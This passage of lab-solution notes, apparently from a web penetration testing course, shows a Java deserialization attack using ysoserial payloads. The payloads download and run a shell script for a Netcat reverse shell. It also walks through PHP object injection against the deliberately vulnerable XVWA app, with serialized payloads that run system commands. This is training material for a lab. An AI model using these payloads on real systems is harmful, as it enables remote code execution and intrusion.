</code></pre><p id="6ccbbacb-f0e6-421b-b9bb-55c903ccfbaf" class="">Step 9: Execute the python exploit code.</p><p id="59624224-e712-4af5-889c-ecfe651ff60b" class="">Usage: python exploit.py &lt;/path/to/payload&gt;</p><p id="846cacde-8725-4b42-bdd1-96345299606e" class="">Command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="89538286-15dd-4aab-992b-f69d255726cd" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">python exploit.py 192.24.161.3 8080 /root/payload.out
</code></pre><p id="fe5c82ea-9be3-4253-b0ed-041220a8624c" class="">This result from the python server shows that shell.sh file is downloaded by the target machine, and the payload is working as expected.</p><p id="29abf851-d1bb-447d-a273-27fba9d68d63" class="">We have to run the python exploit two more times to execute the bash script in the target machine.</p><p id="117bd2bf-e67a-4985-a7fa-682091eade80" class="">Step 10: Generate a payload again for making the downloaded shell.sh file executable.</p><p id="52cdaeae-b0f0-476f-9cc5-dd7028a5c7a0" class="">Command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="c600720f-e4a7-4afd-a5a3-068209542bce" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">java -jar ~/Desktop/tools/ysoserial/ysoserial-master-SNAPSHOT.jar CommonsCollections1 &quot;chmod +x /tmp/shell.sh&quot; &gt; /root/payload.out
</code></pre><p id="7e02683c-c61f-4f46-bd41-2f1c772e285e" class="">Step 11: Execute the python code again to send the payload for making shell.sh file executable.</p><p id="69cfc135-7801-4e79-80a9-2d54031fdd00" class="">Command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="73d0c65c-b6fa-4c27-b21b-f853f7929e30" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">python exploit.py 192.24.161.3 8080 /root/payload.out
</code></pre><p id="071b36f2-45f9-454b-b0fe-3bd8032fda5b" class="">Step 12: Generate a payload for executing the downloaded shell.sh file again.</p><p id="338227e9-8ef4-4870-b77e-b5e49ed62f6a" class="">Command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="bf2236ea-789f-42b3-b067-7928623b3569" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">java -jar ~/Desktop/tools/ysoserial/ysoserial-master-SNAPSHOT.jar CommonsCollections1 &quot;/bin/bash /tmp/shell.sh&quot; &gt; /root/payload.out
</code></pre><p id="627108a5-0127-4e7d-b33a-1e65f603e164" class="">Step 13: Execute the python code again to send the payload to the target machine for executing shell.sh file.</p><p id="125a9d13-93b4-41fa-8172-942367303684" class="">Command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="51239410-17fb-439d-baa8-80ac20ba5e51" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">python exploit.py 192.24.161.3 8080 /root/payload.out
</code></pre><p id="c1c104aa-e932-4ba0-8266-15dc0ee54a89" class="">Step 14: Open the terminal where the Netcat was listening. The shell should arrive on the Netcat listener.</p><p id="5e2d2997-c010-4c82-a9bb-dd044d4900ad" class="">Check the id by the following command.</p><p id="f6ee9fee-d16b-4eac-9cfa-c7f0de9b83f5" class="">Command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="8dd7b79f-8e66-404f-b920-c7d55b8a979f" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">id
</code></pre><blockquote id="a0e4406b-b703-4bda-8aca-ecf497c93dae" class="">Successfully achieved remote code execution.</blockquote><h2 id="1feca67e-22d0-4002-94c1-ec6e70db0d33" class=""><strong>Lab 3</strong><strong><a href="https://johnermac.github.io/notes/ewptx/zattackingserialization/#lab-3"></a></strong></h2><p id="6623654a-9a4f-4131-8191-aa9a6b510077" class="">Solution</p><p id="1aec1dbb-8d53-457c-93a9-f2e97f6f3e8d" class="">Step 1: Open the lab link to access the Kali GUI instance.</p><p id="365d5543-477c-4727-b205-e09828415f10" class="">Step 2: Check if the provided machine/domain is reachable.</p><p id="b355b95a-5635-4404-b5c9-68e67623b460" class="">Command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="da67007d-2687-4423-8761-603e754dcaaa" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">ping -c3 demo.ine.local
</code></pre><p id="de1010d8-c338-4a11-85e2-79bd28b48bd6" class="">The provided machine is reachable.</p><p id="7cfe637e-26c5-4ea0-a2a5-11108c7f2600" class="">Step 3: Check open ports on the provided machine.</p><p id="9d90761d-64bb-4417-827b-d25b8e08e4d6" class="">Command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2fdf472b-0aa6-4906-9f08-0fc8f65fbd51" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">nmap -sS -sV demo.ine.local
</code></pre><p id="c5296d83-57de-49a4-9894-6b1291bea521" class="">Port 80 (Apache webserver) and 3306 (MySQL server) are open on the target machine.</p><p id="1320c7c8-35f2-4e08-8eda-98e76abd5881" class="">Step 4: Open the browser to inspect the hosted website.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="942076a2-a6fa-407f-ac7f-59a056e8d0d5" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">URL: http://demo.ine.local
</code></pre><blockquote id="743d2fb3-4df8-4fe7-9dcc-5e0d537349d3" class="">An instance of XVWA is hosted on the Apache webserver.</blockquote><p id="3fa1ef21-58d4-4af4-af8e-c91fdb0bea16" class="">Step 5: Open PHP Object Injection page.</p><p id="7837f87d-2436-43e2-b902-83450c6709c1" class="">Select PHP Object Injection from the available set of vulnerabilities:</p><p id="cdde8c57-a046-4336-9901-1adb728ccb5f" class="">Step 6: Interact with the vulnerable page.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="3d238d71-6b0b-49ab-9d31-8f54a2ec5109" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Press the CLICK HERE button and notice the resulting URL:
</code></pre><p id="5ec1388f-fd24-4627-bede-26c5dc6717fb" class="">You should see the following URL:</p><p id="882a814d-134e-4358-be08-b731f2fdb20e" class="">http://demo.ine.local/xvwa/vulnerabilities/php_object_injection/?r=a:2:{i:0;s:4:”XVWA”;i:1;s:33:”Xtreme Vulnerable Web Application”;}</p><p id="e5be3dfc-4f43-40ec-8a1c-a93c12f625b2" class="">There is an object in the URL parameter</p><blockquote id="9a7f93ed-e9bb-4aa8-831f-40167f68fff5" class="">If you notice closely, the values present in this parameter - XVWA and Xtreme Vulnerable Web Application are shown on the page.</blockquote><p id="0a80eb01-ae04-4d65-9715-ac9a419acbaf" class="">But what exactly is this object contained in the <strong>r</strong> parameter?</p><p id="5c2f16f1-6968-4964-a891-e81d737d8697" class="">Lets search for it:</p><p id="21e91b99-7e2b-4952-9000-cbe59739ebab" class="">Search string:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1fb29afb-5b22-4a11-b438-99576d481b95" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">a:2:{i:0;s:4:&quot;&quot;;i:1;s:33:&quot;&quot;;}
</code></pre><p id="bfb00922-23fe-47cf-ba19-7d22ce13e3e8" class="">We have intentionally omitted any references to XVWA to avoid getting results specific to it.</p><p id="34833052-6c0e-49dd-b360-9169fbf29136" class="">Notice we got back some results indicating it is serialized PHP data.</p><p id="668d069b-6cf3-41ee-a963-7c08bfea5c8f" class="">One of the comments on SO also indicates to use the PHP serialize and unserialize methods on this kind of input:</p><p id="a7dcaaed-d180-429c-86fe-f0eb60787326" class="">Let’s try to produce similar results using the serialize method from PHP:</p><p id="c3f9195d-6bec-48ca-b77b-6b8099679755" class="">Commands:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a0a0a02b-d250-40d7-9105-9593409e1cf6" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">php -a
echo serialize(&quot;Hello World!&quot;);
echo serialize(array(&#x27;a&#x27;, 2, &#x27;c&#x27;, 4, &#x27;e&#x27;, 6, &#x27;g&#x27;, 8, &#x27;i&#x27;, 10));
</code></pre><p id="7ce96bb6-c37d-4fd0-92c1-9e6298088cfa" class="">The above commands would do the following:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="bb5e6678-0692-4b9d-8415-7bf432879f70" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">php -a: Launch an interactive PHP environment - a REPL (read-eval-print-loop). Here we can run PHP code without having to set up any webserver.
</code></pre><p id="4d1e8fae-61c2-42c9-8370-ab113ae0cce6" class="">The second command serialized the string Hello World!.</p><p id="4db4f4b1-4c0f-49be-9b5f-60ca27ab0fa8" class="">The result is simple enough -</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="eb1521cd-5c0d-4c09-aa83-dbaf8bbe0cda" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">s:12
# indicates what follows is a string of 12 characters.
</code></pre><p id="471ad61f-a02e-4304-a800-ff9e0b63ddfd" class="">The third command goes one step ahead and serializes an array, which is where serialization has its value - more on that shortly.</p><p id="5e1f26e3-ed93-4fe1-b08f-1fec5ce63843" class="">The output says</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="19454d93-d52e-4ced-9d3e-df8b330ae89b" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">a:10
```bash

, indicating what follows is an array of size 10. Then we have all the elements of the array. Each array elements index and value are indicated. For instance, lets consider the first two elements:

```bash
i:0;s:1:&quot;a&quot;
# Element at index 0 is a string of size 1 and that string is &quot;a&quot;.
i:0;i:2
# Element at index 1 is an integer and it&#x27;s value is 2.
</code></pre><blockquote id="3f34d7e1-43c1-4454-a7fb-6dde8b606add" class="">Hopefully, this makes much more sense now.</blockquote><p id="5194ab07-9ddd-4c73-8861-cdcd488b61a0" class="">What’s serialization?</p><ul id="4066ab3f-2022-40f3-b30f-5115b9daa8f5" class="bulleted-list"><li style="list-style-type:disc">Sometimes you get to situations where you have to pass objects over the network, or the state of a program is to be stored for later use. How can you do that, provided that the information is present in an object?</li></ul><ul id="c0edd4da-e8f3-4b3b-b422-d23d29dd645e" class="bulleted-list"><li style="list-style-type:disc">One possibility is to save all the object’s properties and then populate them back later. That would be good, but it would be reinventing the wheel and would not be as optimized and compact as it could have been. Serialized objects must also later be deserialized. Since this is a standard requirement, it is built-in into the programming languages like Java, PHP, and the like.</li></ul><blockquote id="8ce6e99c-5201-4d4a-9545-aacb89c57aa6" class="">Now that we know the parameter we saw in the URL was actually a PHP serialized object, let’s figure it out using what we learned above:</blockquote><p id="6edc4b9b-9a6d-4bca-b0ad-1454fc5d780f" class="">Commands:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="fccfdcba-5ed6-479a-b080-0a1033297c4d" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">php -a
echo unserialize(&#x27;a:2:{i:0;s:4:&quot;XVWA&quot;;i:1;s:33:&quot;Xtreme Vulnerable Web Application&quot;;}&#x27;);
var_dump(unserialize(&#x27;a:2:{i:0;s:4:&quot;XVWA&quot;;i:1;s:33:&quot;Xtreme Vulnerable Web Application&quot;;}&#x27;));
</code></pre><p id="c299a1a1-164e-444b-bd16-7c5a3e7ab7ba" class="">We run the PHP code from the interactive mode and unserialize the PHP object. Notice that it is an associative array having two items.</p><p id="b89a8e0b-d135-48f7-8378-4370ce89a0ff" class="">Check the PHP manual for unserialize:</p><p id="505a22f1-2791-47f7-b3b2-7128917bdad8" class="">Notice the big red warning message. It’s a clear warning to the developers about the RCE threat if they pass user-controlled input to the unserialize function.</p><p id="9734c440-8701-4afe-910f-06083efe8d31" class="">Step 7: Check the source code of the PHP Object Injection page from Github.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="93d45876-6be6-45ae-bfc0-85da135d4579" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">URL: https://github.com/s4n7h0/xvwa/blob/master/vulnerabilities/php_object_injection/home.php
</code></pre><p id="70545333-57d5-4306-92f8-09aca4786ee8" class="">Notice the relevant code snippet shown in the above image. If the request contains the parameter <strong>r</strong>, its value is unserialized. Also, notice the call to <strong>eval</strong> - the inject parameter is directly passed to <strong>eval</strong>, which is an excellent opportunity for RCE.</p><p id="d1d72e0e-7b27-4a1a-80c0-fd24e343de08" class="">Step 8: Exploit the insecure PHP deserialization vulnerability.</p><p id="ad6ee2df-c773-407c-bad2-9d153fd72265" class="">Save the following code snippet as object.php</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="12cfa443-62ff-403c-9dbe-566e1a24e185" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;?php
class PHPObjectInjection {
    public $inject = &quot;system(&#x27;id&#x27;);&quot;;
}

$obj = new PHPObjectInjection();
var_dump(serialize($obj));
?&gt;

</code></pre><p id="2b0c1a5d-72c9-47e4-85fa-262ee619ce7f" class="">Notice the above code snippet sets the inject parameter to system(‘id’), which would run the id command on the webserver.</p><p id="b9cc3e8b-57c1-4e79-9197-f7c82a0ed301" class="">Serialize the object:</p><p id="0667217b-786d-48d7-af62-1aa45463180a" class="">Command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="0733879c-0bf7-466c-9239-f6dc62f30d1a" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">php object.php
</code></pre><p id="e46c3254-28ca-4cb3-9951-d6245f13f4b2" class="">Serialized payload:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="8974f91a-e11c-4d21-abb4-72607094a32f" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">O:18:&quot;PHPObjectInjection&quot;:1:{s:6:&quot;inject&quot;;s:13:&quot;system(&#x27;id&#x27;);&quot;;}
</code></pre><ul id="316093d6-c1a4-4967-bf06-dd2b588e3349" class="bulleted-list"><li style="list-style-type:disc">Assign the generated value in the <strong>r</strong> parameter in the URL:</li></ul><p id="fa5d91b7-3ac4-4828-bb64-3db51b0d32c5" class="">Notice the results of the id command are shown on the page.</p><p id="506fc9aa-a601-4ceb-a368-cd787f6b4d78" class="">With that, we successfully exploited the insecure deserialization issue to run arbitrary commands.</p><p id="c78bf197-3a65-4b2f-aced-dacc21e9dcfc" class="">Step 9: Check the list of running processes.</p><p id="930e09fa-940d-4546-8e4f-2d9f9d70fe4a" class="">Now that we have code execution on the target server, let’s check the list of running processes:</p><p id="d7e49fbf-1a82-46aa-9300-0f099d161e33" class="">Save the following code snippet as object.php</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1110adcb-4535-46e8-8675-f2c07de76934" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;?php
class PHPObjectInjection {
    public $inject = &quot;system(&#x27;ps aux&#x27;);&quot;;
}

$obj = new PHPObjectInjection();
var_dump(serialize($obj));
?&gt;

</code></pre><p id="6d6214f2-a872-4047-abfc-d90a888a9feb" class="">Serialize the object:</p><p id="03e5eb1a-88d9-4993-8e2b-ff04dbcbeef0" class="">Command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="fb6372ee-9139-4304-98ae-1172fe31225f" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">php object.php
